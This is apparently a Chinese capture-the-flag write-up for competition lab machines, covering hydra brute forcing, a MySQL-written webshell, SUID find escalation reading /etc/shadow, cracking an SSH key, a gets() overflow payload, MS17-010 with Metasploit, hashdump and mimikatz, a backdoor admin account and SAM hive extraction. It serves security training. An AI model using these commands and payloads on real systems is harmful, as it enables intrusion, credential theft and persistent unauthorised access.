通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件名称作为Flag值提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/d6e9MMX7gUHRaJqN1710404886.png)\n\n##### FLAG6: ureansma\n\n#### 7.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件内容作为Flag值提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/SpScdhwp8vziCvB01710404886.png)\n\n##### FLAG7: jtluqwtr\n\n#### 8.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件名称作为Flag值提交；\n\n 因为nc到后门端口root权限所以这题可以直接做，一般来说正常操作前面的题应该先用mysql弱口令连接 写入webshell来做，到这步再用后门端口连接。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4opiri0tNVxcNZjm1710404886.png)\n\n##### FLAG8: radentas\n\n#### 9. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件内容作为Flag值提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VeZnNS1WThO09dqu1710404887.png)\n\n##### FLAG9: erqruet\n\n\n\n### Linux操作系统渗透测试（mysql弱口令+webshell）\n\n**任务环境说明：**\n\n\t服务器场景：Linux（关闭链接）\n\t服务器场景操作系统：Linux（版本不详）\n\n#### 1.  通过本地PC中渗透测试平台Kali对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中MySQL数据库对应的服务版本信息字符串作为FLAG提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/My2Ek1K0LDkXaSmL1710404887.png)\n\n##### FLAG1: MySQL 5.1.73-log\n\n#### 2.  通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件名称作为FLAG提交；\n\nhydra进行mysql服务爆破\n\n```\nhydra -l root -P /root/2.txt mysql://192.168.31.142\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YfPjir3cujJoDdcv1710404887.png)\n\n这里的mysql密码为 **3112ab** 是字典中后面的部分，所以爆破会很慢 可能会以为爆破不出来 但其实是可以的。\n\n连接mysql数据库 写木马\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RQyWrFLOS69bLWVq1710404887.png)\n\n然后访问写好的 **shell.php** 用hackbar传参 或者连接蚁剑。\n\n成功连接。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hwosh06BkQzpWm6d1710404887.png)\n\n##### FLAG2: loginmanager\n\n#### 3.  通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件内容作为FLAG提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/r7hl4YC8phOsqw7g1710404887.png)\n\n##### FLAG3: slkrvung\n\n#### 4.  通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp文件的文件名称作为FLAG提交； \n\n**这里的apache用户直接有root权限**，一般来说的webshell都没有root权限，后续的渗透需要提权。但这里直接就是root权限了，那后面的几题就可以直接接着用webshell来做\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/aZZSTPVzyf1BcZlH1710404888.png)\n\n可以看到这里权限多了一个root\n\n接下来看/root路径的文件即可。\n\n```\nls /root\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/R5lbzNDTbaxtfxRH1710404888.png)\n\n##### FLAG4: vmifeo\n\n#### 5.  通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp的图片文件中的英文单词作为FLAG提交。\n\n像是查看图片文件的内容一般都是**把文件复制到网页路径下去查看**，或者可以用scp下载。\n\n```\ncp /root/*.bmp /var/www/html/test.bmp;chmod 777 test.bmp\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/B119KoMUvFAgDxhk1710404888.png)\n\n```\nhttp://192.168.31.142/test.bmp\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/gYz6gpqq5MxdVdj81710404888.png)\n\n##### FLAG5: glamorous\n\n\n\n### *Linux系统渗透提权（suid提权）\n\n任务环境说明：\n\n服务器场景：Server2203（关闭链接）\n\n**用户名：hacker     密码：123456**\n\n*2022浙江省赛同一道\n\n#### 1.使用渗透机对服务器信息收集，并将服务器中SSH服务端口号作为flag提交；\n\n先用nmap正常扫描\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jxCsGRiIwdShd4tT1710404888.png)\n\n发现只有一个111端口，显然是不可能的，所以nmap扫描方式改为 **全端口探测扫描**\n\n```\nnmap -Pn -sS -p- 172.16.101.250\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4DsUxZSm4b7AsExP1710404888.png)\n\n这个 **2232** 端口很可疑，用sV详细扫描下。\n\n```\nnmap -n -sV -p2232 172.16.101.250\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/mozxM3o1YTstvULl1710404889.png)\n\n扫描后得知 2232端口为ssh的端口\n\n##### FLAG1: 2232\n\n#### 2.使用渗透机对服务器信息收集，并将服务器中主机名称作为flag提交；\n\n这里一定要看清楚题目，题目是**有给登录的账号名和密码的**，刚开始我拿到这题就直接用hydra爆破root密码了，所以比赛的时候一定要看清楚题目，能省下很多时间。\n\n题目给到账号密码为 **hacker;123456**\n\n那么用ssh登录即可，注意用-p指定端口\n\n```\nssh -p2232 hacker@172.16.101.250 //123456\n```\n\n成功登录。\n\n因为ssh登陆后就跟linux终端一样，主机名会显示在用户名右边，所以这里可以直接看：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qDyxjIGCaTKpVPrk1710404889.png)\n\n或者用 **hostname** 来看\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SWyKGdaWMVAcmj7N1710404889.png)\n\n##### FLAG2: 1doLfH31\n\n\n\n#### 3.使用渗透机对服务器信息收集，并将服务器中系统内核版本作为flag提交；\n\n查看内核版本使用 **uname -r** 即可\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qWj1PR1zOw4hhIyE1710404889.png)\n\n##### FLAG3: 2.6.18\n\n\n\n#### *4.使用渗透机对服务器管理员提权，并将服务器中root目录下的文本内容作为flag提交；\n\n然后这里就是提权了，提权的一般思路大致有两种：\n\n1.**利用suid提权**，使用find命令找到有高权限的命令，然后使用该命令提权\n\n2.**利用系统版本内核漏洞提权**，使用searchsploit找到对应的Exp，然后编译 执行 提权。\n\n由于服务器内没有gcc命令，不能编译。这里使用的是 **suid提权**。\n\n利用find命令参数 **-perm -4000** 找到高权限命令。\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iukLQSp4AGYDK0ZS1710404889.png)\n\n在结果中找到了find命令为高权限，一般来说在结果中找到find命令提权成功的概率极高，所以看到这个可以说是十拿九稳。\n\n利用**find参数-exec执行命令**提权。\n\n首先，先cd到/tmp路径下并创建一个任意文件（只要是有权限创建文件的目录都行）\n\n```\ncd /tmp\ntouch 1\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rH7D4v5CYYRg1nY01710404890.png)\n\n然后，使用find命令提权。\n\n```\nfind 1 -exec id \\;\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/O4pthzJtwzKA5JzC1710404890.png)\n\n能看到有root权限了，那么直接做题即可。\n\n查看/root路径发现文本名为key.txt\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kHfJipSTtoeoSzRh1710404890.png)\n\ncat得到FLAG\n\n```\nfind 1 -exec cat /root/key.txt \\;\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Qzaq6PG8wZW73KIy1710404890.png)\n\n##### FLAG4: 84pPxbiP\n\n#### *5.使用渗透机对服务器管理员提权，并将服务器中root的密码作为flag提交；\n\n获取密码的思路就是读取 **/etc/shadow** 文件，复制root的密文到本地，然后使用kali自带工具 **john** 进行爆破明文。\n\n```\nfind 1 -exec cat /etc/shadow \\;\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/fDnA0F1UXehpVwtV1710404890.png)\n\n复制到本地文件key。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/cFK9hJI2E7yNrgdn1710404890.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9grsovwSp3Gb3zjq1710404891.png)\n\njohn爆破：\n\n```\njohn key\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QZOyiX6jaMxbzHnk1710404891.png)\n\n得到明文为 **darkman**\n\n##### FLAG5: darkman\n\n#### *6.使用渗透机对服务器管理员提权，并将服务器中root目录下的图片内容作为flag提交。\n\n要获取图片内容这里优先考虑**下载图片**，因为我们已经有了root的账号密码并且**ssh服务是开启**的。\n\n（一般来说开启http服务拖到网站也是可行，但是环境有限，并不会给你相关的命令用于开启服务，所以还是要用现有的东西来做。）\n\n先看下root下的图片名字\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/GcogYyuag5B3DGRy1710404891.png)\n\n图片名： **picture.png**\n\n使用scp命令下载：\n\n```\nscp -P2232 root@172.16.101.250:/root/picture.png ./ \t//darkman\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/7Y72CmzalyKYTdwz1710404891.png)\n\n图片内容：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bLXrbE4EQ6Zh8Ecp1710404892.png)\n\n图片是反着的，拖到windows里用画图自带的图片旋转功能处理下：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yN2GmB9l3gQqJIGy1710404892.png)\n\n（文字中有一个字母是反着的F，不确定标准答案是什么）\n\n##### FLAG6: HUCKGFFT\n\n\n\n### *应用服务漏洞扫描与利用（Linux私钥登录+缓冲区溢出）\n\n任务环境说明：\n\n\t服务器场景：Server15\n\t服务器场景操作系统：未知（关闭链接）\n\n#### 1.  使用命令nmap探测目标靶机的服务版本信息，将需要使用的参数作为FLAG进行提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rv0icrCW3EmFiyiR1710404892.png)\n\n##### FLAG1: sV\n\n#### 2.  通过上述端口访问靶机系统并探测隐藏的页面，将找到的敏感文件、目录名作为FLAG（形式：[敏感文件或目录1,敏感文件或目录2…,敏感文件或目录n]）提交；\n\n扫描到了一个31337的http端口，用dirb扫描\n\n```\ndirb http://192.168.31.185:31337\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ebywLjUx3192r5np1710404892.png)\n\n\n\n##### FLAG2: [.ssh,robots.txt]\n\n#### 3.  通过上述敏感文件或目录下载可利用的私钥和认证关键字文件，将私钥文件名和认证关键字文件名作为FLAG（形式：[私钥文件名,认证关键字文件名]）进行提交；\n\n扫到了一个 **.ssh** 访问\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/sEFSyxRoaDvmnwxD1710404893.png)\n\n下载\n\n```\n192.168.31.185:31337/.ssh/id_rsa\t//私钥\n192.168.31.185:31337/.ssh/authorized_keys\t//认证文件\n```\n\n##### FLAG3: [id_rsa,authorized_keys]\n\n#### 4.  查找认证关键字文件中用于登录靶机服务器的用户名，将用户名作为FLAG提交；\n\n把下载的文件复制到KALI。\n\n```\ncat authorized_keys\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/7W7LC4kAnhekcA8n1710404893.png)\n\n##### FLAG4: simon\n\n#### 5.  使用该用户名及私钥登录靶机服务器，将服务器返回信息的第一行结尾的最后一个英文单词作为FLAG提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JIl74wHquK7jA0fR1710404893.png)\n\n##### FLAG5: established\n\n#### 6.  将私钥文件进行格式转换后进行解密，将成功解密出的密码作为FLAG提交；\n\n这里登录用id_rsa私钥文件认证 用户指定认证文件中的用户：\n\n```\nssh -i id_rsa simon@192.168.31.185\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/BGbrQ2KnkVyBDLij1710404893.png)\n\n此时需要密码才能登陆\n\n这里密码需要用 **john** 工具自带的脚本 **ssh2john.py** 进行转换，得到 **私钥** 的哈希值，再用 **john** 爆破哈希值。\n\n```\npython /usr/share/john/ssh2john.py id_rsa > keys\njohn keys\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XM0EFMTV7Z8ZAXLz1710404893.png)\n\n得到密码为 **starwars**\n\n这时候再用密码登录，即可上线靶机。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pypMNHw8cCloCHS31710404894.png)\n\n##### FLAG6: starwars\n\n#### 7.  利用靶机服务器上的溢出程序进行提权，将接收用户输入的缓冲区的大小作为FLAG提交；\n\n到root路径下发现一个.c文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5hWahX76vuhqMRhX1710404894.png)\n\n源码如下：\n\n```c++\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n// You're getting close! Here's another flag:\n// flag2{use_the_source_luke}\n\nint main(int argc, char *argv[]) {\n    char program[] = \"/usr/local/sbin/message\";\n    char buf[20];\n    char authorized[] = \"Simon\";\n\n    printf(\"What is your name?\\n\");\n    gets(buf);\n\n    // Only compare first five chars to save precious cycles:\n    if (!strncmp(authorized, buf, 5)) {\n        printf(\"Hello %s! Here is your message:\\n\\n\", buf);\n        // This is safe as the user can't mess with the binary location:\n        execve(program, NULL, NULL);\n    } else {\n        printf(\"Sorry %s, you're not %s! The Internet Police have been informed of this violation.\\n\", buf, authorized);\n        exit(EXIT_FAILURE);\n    }\n\n}\n```\n\n使用find命令查找命令\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RwfhecVXcnNNZOas1710404894.png)\n\n发现这个read_message编译的文件，可以直接使用，且为高权限。\n\n接下来就是来看代码的漏洞\n\nbuf的数组长度只有20，而 ```gets(buf);``` 可以无限输入，导致了漏洞。\n\n这里程序要求输入的前5个字符为 ```Simon``` 然后会执行 ```program(/usr/local/sbin/message)``` 当我们溢出buf时可以修改program为 ```/bin/sh```，那么此时传入到execve就为\n\n```\nexecve('/bin/sh', 0, 0);\n```\n\n因为该程序suid为4000，有root的高权限。此时就会以root权限执行/bin/sh 此时就成功提权了。\n\n内存情况：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/D0O6iSvhLdnMuxzm1710404894.png)\n\nPayload：\n\n```\nSimonAAAAABBBBBCCCCC/bin/sh\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/z9DNdib0qJph1zE01710404894.png)\n\n##### FLAG7: 20\n\n#### 8.  成功提权后将获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：[文件名]）提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0BeVJZFOz4PWAfoR1710404895.png)\n\n##### FLAG8: chjenie.txt\n\n#### 9.  利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：[文件内容]）提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vMA7ogAuxD8XOM351710404895.png)\n\n\n\n##### FLAG9: das_bof_MEISTER\n\n### *服务远程控制（Windows smb服务连接）\n\n任务环境说明：\n\t服务器场景名：20200609（关闭链接）\n\t服务器场景操作系统：未知\n\t服务器场景用户名：root\n\t服务器场景密码：Admin123\n\n本题提供了账号密码，**root;Admin123**\n\n#### 1.   通过本地PC中渗透测试平台Kali对服务器场景进行系统版本扫描渗透测试，并将该操作显示结果中系统信息作为FLAG提交；\n\n```\nnmap -sV 192.168.31.126\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WmCTkhMgPMovYpLa1710404895.png)\n\n##### FLAG1: Windows Server 2008 R2 - 2012\n\n#### 2.   通过本地PC中渗透测试平台windows7对服务器场景进行终端服务开启，并将该操作显示结果中服务端口号作为FLAG提交；\n\n终端服务开启，是指**telnet**服务。开启了telnet服务就能用终端远程连接了。\n\n这题做法是用**注册表的远程连接**和**服务的远程连接**来做，这一题开不了3389远程。\n\n必须要先用注册表远程连接后，才能用服务的远程连接，才能开服务！\n\n**win+r -> regedit **打开注册表\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xGQRU3BIcwhCHrDd1710404895.png)\n\n文件 -> 连接网络注册表\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/l8MxAZtZzsvtHWym1710404896.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JDNmUk2C5zzbIxtV1710404896.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/PvazfNmBavHgn5iB1710404896.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Sy0eKHZ5pzYBqS5p1710404896.png)\n\n这样就算成功了\n\n此时，我们再打开服务：\n\n**win+r -> services.msc**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/009LoA7iA1yz6Pju1710404896.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/geUNYWSPYxOUwGJW1710404897.png)\n\n此时就连入靶机的服务了，我们需要修改telnet服务，右键将其开启。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vLsXbnEMgrOfdpBk1710404897.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/fJF6KJrfIKCRystM1710404897.png)\n\n那么靶机的服务开启完毕。我们再用nmap扫描一次，查看该服务的端口：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/gkyEgffmRXviZ3dx1710404897.png)\n\n##### FLAG2: 1000\n\n#### 3.   通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的管理员用户的桌面下中的可执行文件，并将全称作为FLAG提交；\n\n```c++\ntelnet 192.168.31.126 1000 // telnet连接目标靶机，端口设置为1000端口\n```\n\n使用题目给的账号密码进行登录。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lKkYpB6rI4qrWwFF1710404898.png)\n\n成功登录。这里用 ```chcp 65001```可以修复编码问题\n\ncd到Desktop查看可执行文件即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jApz0KSnoOCWaIHY1710404898.png)\n\n##### FLAG3: nc.exe\n\n#### 4.   通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的管理员桌面下的文本文档，将文件内容作为FLAG提交；\n\n这里桌面下没发现有txt文本，说明是隐藏文件。用 ```dir /a``` 来看能发现该文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XqUCXmCy4BUeGuzL1710404898.png)\n\n再用 ```type text.txt``` 查看文件内容：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0jt9nPegAp1vrGH31710404898.png)\n\n接下来几题用cmd也能做，不过最好是用共享文件夹来做。\n\n```c++\nnet share // 查看共享文件夹\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MMJ7w7AXW2hfsSpT1710404899.png)\n\n输入该命令发现C盘是共享的，那么我们可以直接用windows的资源管理器访问：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bS6L9aC3L7zQzx7s1710404899.png)\n\n输入给定的账号密码，即可进入服务器的C盘。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MA8Mk0GYk35JUl531710404899.png)\n\n找到 ```C:\\users\\Administrator\\Desktop\\ ``` 发现该文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2UKdhpUcJzlHsiQu1710404899.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WlyGHbwgXuJFlKl71710404899.png)\n\n##### FLAG4: waste\n\n#### 5.   通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的管理员用户的文档中的文件，将文件内容作为FLAG提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/r4jRzlfbwqXSV3wc1710404900.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/77Ac3L2Ikvn7HvY31710404900.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0AI6TbvRONQM3Run1710404900.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Afp4ZfvNqrrSM4aM1710404900.png)\n\n##### FLAG5: This document\n\n#### 6.   通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的后门用户并将用户名作为FLAG提交；\n\n后门用户使用 ```net user``` 查看不到该用户![](http://cdn.anyiblog.top/WriteUp/20240314/N8M1dzncRsx77gpp1710404900.png)\n\n很有可能是带有$的隐藏用户，这里要查看管理员组才能看见\n\n```c++\nnet localgroup administrators // 查看admin管理组成员\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1jx4mt2zySBfmiQD1710404900.png)\n\n##### FLAG6: break$\n\n#### 7.   通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的桌面背景，并将的文件全称作为FLAG提交；\n\n桌面背景图片路径：\n\n```\nC:\\Windows\\Web\\Wallpaper\\Windows\\\n```\n\n需要记一下，访问得到文件名\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Hv8bCvZvFllKE2CK1710404901.png)\n\n##### FLAG7: img0.jpg\n\n这题做法可能就是用共享文件夹吧，因为开启了共享。3389远程行不通，可能是个陷阱。\n\n\n\n### Windows操作系统渗透测试（ms17010）\n\n任务环境说明：\n\t服务器场景：Server05\n\t服务器场景操作系统：Windows（版本不详）（封闭靶机）\n\n#### 1.  通过本地PC中渗透测试平台Kali对服务器场景进行系统服务及版本扫描渗透测试，并将该操作显示结果中445端口对应的服务版本信息字符串作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hQFyAjPUwNnr5Zju1710404901.png)\n\n##### FLAG1: Microsoft Windows XP microsoft-ds\n\n#### *2.  通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景网络连接信息中的DNS信息作为Flag值 (例如：114.114.114.114) 提交；\n\n445端口开放着就一般是 **MS17_010、MS08_067** 这些模块\n\n可以用nmap探测脚本扫描验证下。\n\n```\nnmap -p445 --script smb-vuln-ms17-010 172.16.101.249\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1lLoAaQmLOEW6VSE1710404901.png)\n\n这里一定要用 永恒之蓝的**psexec**模块：```exploit/windows/smb/ms17_010_psexec``` 才能打进去\n\n如果时永恒之蓝会因为**版本位数**不同导致打不进去，靶机是x32，但永恒之蓝payload只支持x64。\n\n```\nmsfconsole\nuse exploit/windows/smb/ms17_010_psexec\nset rhosts 172.16.101.249\nrun\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Hv3wEODV6pDwRWxM1710404901.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/wxT9p0jnaZYQVwKA1710404901.png)\n\n##### FLAG2: 202.103.24.68\n\n#### 3.  通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景中的当前最高账户管理员的密码作为Flag值提交； \n\n在 **meterpreter** shell中，利用 **hashdump** 获取管理中的哈希值，再用彩虹表进行爆破\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/q4zIl8MzdDtYWEO51710404901.png)\n\n```\nAdministrator:500:a52211d95d0732daa778a48e009b81b1:6521312dcc80ff0a07e62b56cc91660a:::\nophcrack -> single hash -> crack\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JB82a2QjSAjkm8Wd1710404902.png)\n\n或者用mimikatz直接获取\n\n```\nload mimikatz\ncreds_all\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/IMFsocQW8ND09f4y1710404902.png)\n\n##### FLAG3: skasdadsje\n\n#### 4.  通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为Flag值提交；\n\n这里用得到的管理员账号密码登录，或者添加一个后门用户。\n\n```\nAdministrator;skasdadsje\n```\n\n后门用户添加：\n\n```\nnet user hacker 123456 /add\nnet localgroup administrators hacker /add\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ycu1YDDaFYxtvETu1710404902.png)\n\n**开远程**：（这里得用注册表才行，wmic有时候不行）\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n```\n\n远程登陆\n\n```\nmstsc -> hacker;123456后门用户登录\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RPD5IM6BuhWAPSzk1710404902.png)\n\n找到admin的桌面文件夹：\n\n```\nC:\\Documents and Settings\\Administrator\\桌面\\\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lnohOvnmEKbEd8y31710404903.png)\n\n##### FLAG4: frvuewrj\n\n#### 5.  通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/K14RDKnkW42Qjug21710404903.png)\n\n这里可能是环境有点bug，不确定正确答案。这个docx文档无法正常打开，只是一堆字符串。\n\n在回收站找到了一个docx，疑似是flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Gca43jmaDOZyjrI41710404903.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bG5iqDfaCxDI02q31710404903.png)\n\n##### FLAG5: fdskjewn\n\n#### 6.  通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Mv5XKfhGBTKbODpC1710404903.png)\n\n##### FLAG6: vigorous\n\n\n\n### *Windows操作系统渗透测试（telnet+mimikatz提取哈希）\n\n服务器场景：Server2003\n\n服务器场景操作系统：Windows7\n\n#### 1. 通过本地PC中渗透测试平台Kali对服务器场景Windows进行系统服务及版本扫描渗透测试，并将该操作显示结果中Telnet服务对应的端口号作为FLAG提交；\n\n初步扫描 没有看到telnet相关的端口\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/tvuWgTMEzfhTRRJx1710404904.png)\n\n那就用 **-p-** 扫描下全端口，这里最好加个 T4 和 sS Pn 快速扫描\n\n```\nnmap -n -sS -Pn -T4 -p- 192.168.31.158 2>/dev/null\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5VZ1iczpFheIA8yF1710404904.png)\n\n找到一个232端口，详细扫下\n\n```\nnmap -n -p232 -sV 192.168.31.158\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vSlxNTMqGD7HLU2U1710404904.png)\n\n确认232端口为telnet服务\n\n##### FLAG1: 232\n\n#### 2. 通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为teltest），将hydra使用的必要参数当做FLAG进行提交（例：nmap -s -p 22）；（字典路径/usr/share/wordlists/dirb/small.txt）\n\nhydra记得指定232端口。\n\n```\nhydra -l teltest -P /usr/share/wordlists/dirb/small.txt telnet://192.168.31.158:232\n// hydra -l teltest -P /usr/share/wordlists/dirb/small.txt 192.168.31.158 telnet -s 232\n```\n\n##### FLAG2: hydra -l -P -s telnet\n\n#### 3. 通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为teltest），将破解成功的密码当做FLAG进行提交；（字典路径/usr/share/wordlists/dirb/small.txt）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/T4ETr1GRDXxh896b1710404904.png)\n\n##### FLAG3: customer\n\n#### 4. 通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，取得的账户密码有远程桌面权限，将该场景系统中sam文件使用reg相关命令提取，将完整命令作为FLAG提交；\n\n这题可以直接vnc连接，或者用mstsc远程。由于我是本地测试的环境，所以这里就用远程。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ook7yCnhGMaGJ1SA1710404904.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jBAYAAXn1NAFStTG1710404905.png)\n\n\n\n以管理员权限打开cmd，然后用reg提取SAM文件：\n\n```\nreg save HKLM\\SAM sam.hive\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RtaxFKSojPW2TYhk1710404905.png)\n\n##### FLAG4: reg save hklm\\sam sam.hive\n\n#### 5. 通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，取得的账户密码有远程桌面权限，将该场景系统中system文件使用reg相关命令提取，将完整命令作为FLAG提交；\n\n```\nreg save HKLM\\SYSTEM system.hive\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xCPLemWi4s6eR9TH1710404905.png)\n\n##### FLAG5: reg save hklm\\system system.hive\n\n#### 6. 通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，将sam文件与system文件提取到本地，使用桌面mimikatz工具提取teltest密码信息，将提取信息的命令作为FLAG提交;\n\n（这里的环境没有mimikatz，但是浙江省赛的时候这题桌面上是有mimikatz的，而且还有一堆工具。）\n\n所以用远程的传输功能，把本地的mimikatz传给靶机上。\n\n在共享的磁盘放入mimikatz。\n\n共享本地的磁盘：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/adDKJjZtqS9AZAaA1710404905.png)![](http://cdn.anyiblog.top/WriteUp/20240314/VvYYf6BKpPbnHPj71710404905.png)\n\n用靶机打开共享文件夹，拖出mimikatz。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/c0X9T6K6B3ZsYylk1710404906.png)![](http://cdn.anyiblog.top/WriteUp/20240314/dbaxa7Avdoeq6QUG1710404906.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/H48I8KdF5GPaFGqo1710404906.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/H0I4BWejdP